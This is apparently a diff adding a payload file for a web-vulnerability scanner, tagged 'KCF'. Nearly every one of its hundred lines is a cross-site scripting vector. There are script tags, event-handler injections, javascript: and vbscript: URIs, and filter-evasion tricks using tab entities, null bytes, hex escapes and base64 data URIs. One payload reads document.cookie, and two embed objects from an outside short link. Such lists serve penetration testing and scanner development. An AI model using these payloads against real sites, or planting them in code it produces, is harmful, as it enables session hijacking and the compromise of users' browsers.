@@ -1,0 +1,100 @@
+<SCRIPT>+alert("KCF");</SCRIPT>
+<SCRIPT>+alert("KCF")</SCRIPT>
+<script>alert(1)</script>
+<script>alert(/KCF/)</script>
+' '><script>alert(1)</script>
+''><script>alert(1)</script>
+<svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>
+∀㸀㰀script㸀alert(1)㰀/script㸀
+&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+<a href="j&#x26;#x26#x41;vascript:alert%252831337%2529">KCF</a>
+<scr\x00ipt>confirm(1);</scr\x00ipt>
+<svg/onload=prompt(1);>
+<svg><script>alert&#40/1/&#41</script>
+<isindex action="javas&Tab;cript:alert(1)" type=image>
+<form action='data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt'><button>CLICK
+<form action='java&Tab;scri&Tab;pt:alert(1)'><button>CLICK
+<form action=javascript&NewLine;:alert(1)><input type=submit>
+<form action="javas&Tab;cript:alert(1)" method="get"><input type="submit" value="Submit"></form> 
+<form action="&Tab;javas&Tab;cript&Tab;:alert('KCF :)')" autocomplete="on"> First name:<input type="text" name="fname"><br><input type="submit"></form>     
+<form id="myform" value="" action=javascript&Tab;:eval(document.getElementById('myform').elements[0].value)><textarea>alert(1)</textarea><input type="submit" value="Absenden"></form>
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/KCF/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1&#x29;"/alt="/"src="/"onerror=eval(id&#x29;>'"><img src="http://127.0.0.1:3555/xss_serve_payloads/kcf.jpg">
+<script>var url = "<!--<script>";//</script>alert(1)</script>
+<form id="myform" value=""+{valueOf:location,length:1,__proto__:[],0:"javascript :alert (1)"}"action=javascript&Tab;:eval(document.getElementById('myform').elements[0].value)><textarea>alert(1)</textarea><input type="submit" value="Absenden"></form>
+<iframe/src="data:text/html,<svg%09%0A%0B%0C%0D%A0%00%20onload=confirm(1);>">
+<svg/contentScriptType=text/vbs><script>Execute(MsgBox(chr(75)&chr(67)&chr(70)))
+<img/src='http://127.0.0.1:3555/xss_serve_payloads/kcf.jpg' onmouseover=&Tab;prompt(1)
+<svg><script>alert&#40 1&#41
+<embed/src=//goo.gl/nlX0P>
+<object/data=//goo.gl/nlX0P>
+<iframesrc="javascript:alert(2)">
+<iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=">
+<isindexformaction="javascript:alert(1)" type=image>
+<input type="image" formaction=JaVaScript:alert(0)>
+<form><button formaction=javascript&colon;alert(1)>CLICKME
+<form action="Javascript:alert(1)"><input type=submit>
+<isindex action="javascript:alert(1)" type=image>
+<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
+<isindex action=data:text/html, type=image>
+“/><marquee onfinish=confirm(1)>a</marquee>
+<object data='data:text/xml,<script xmlns="http://www.w3.org/1999/xhtml ">confirm(1)</script>>'>
+<img src= "a" onerror= 'eval(atob("cHJvbXB0KDEpOw=="))'
+<script>alert('KCF')</script>=a
+<script>document.write(toStaticHTML("<style>div{font-family:rgb('0,0,0)'''}foo');color=expression(alert(1));{}</style><div>POC</div>"))</script>
+';!--"<XSS><script>alert(1);</script>={()}
+<script>document.body.innerHTML="<a onmouseover%0B=location='\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x61\x6C\x65\x72\x74\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B'><input name=attributes>";</script>
+asfunction:getURL,javascript:alert(1)//
+\%22))}catch(e){}if(!self.a)self.a=!alert(1)//
+"]%29;}catch%28e%29{}if%28!self.a%29self.a=!alert%281%29;//
+0%5C"))%7Dcatch(e)%7Bif(!window.x)%7Bwindow.x=1;alert(1)%7D%7D//
+<button/onclick=alert(1) >KCF</button>
+<a onmouseover=(alert(1))>KCF</a>
+<p/onmouseover=javascript:alert(1); >KCF</p>
+<article xmlns="><img src=x onerror=alert(1)"></article>
+<article xmlns="x:img src=x onerror=alert(1) ">
+<p style="font-family:'\22\3bx:expression(alert(1))/*'">
+<svg><style>&ltimg src=x onerror=alert(1)&gt</svg> 
+<listing>&ltimg src=x onerror=alert(1)&gt</listing>
+"onmouseover=alert(1);a="
+'+alert(1)&&null=='
++alert(1)&&null=='
+\\\'><script>1<\\/script>
+\\\'><body onload=\\\'1\\\'>
+\"><script>1<\\/script>
+><script>1<\\/script>
+\"><body onload=\"1\">
+<img src=\"x:kcf\" onerror=\"alert(1)\">
+<img src=a onerror=alert(1)
+<script>alert(\'1\')</script>
+<script>alert(\'\\\\1\\\\\')</script>
+<script>alert(\'\\/\\1\\/\\\')</script>
+\'\'\">
+<scri%00pt>alert(1);</scri%00pt>
+<scri\x00pt>alert(1);</scri%00pt>
+<s%00c%00r%00%00ip%00t>confirm(1);</s%00c%00r%00%00ip%00t>
+<script>alert(1);</script>
+<%0ascript>alert(1);</script>
+<%0bscript>alert(1);</script>
+<!--[if]><script>alert(1)</script -->
+<SCRIPT> alert(\"1\");</SCRIPT>
+<SCRIPT> alert(\"1\")</SCRIPT>
+<script>alert([!![]] [])</script>
+<var onmouseover="prompt(1)">KCF</var>
+''">
+-alert(1)-
+-prompt(1)-
+<marquee/onstart=confirm(1)>
+javascript:confirm(1)
+javascript:confirm(1);
+javascript:alert(1)
+javascript:alert(1);
+avascript&#00058;alert(1)
+javaSCRIPT&colon;alert(1)
+JaVaScRipT:alert(1)
+javas&Tab;cript:\u0061lert(1);
+javascript:\u0061lert&#x28;1&#x29
+javascript&#x3A;alert&lpar;document&period;cookie&rpar;
+vbscript:alert(1);
+vbscript&#00058;alert(1);
+vbscr&Tab;ipt:alert(1)"
+'';!--"<KCF>=&{()}
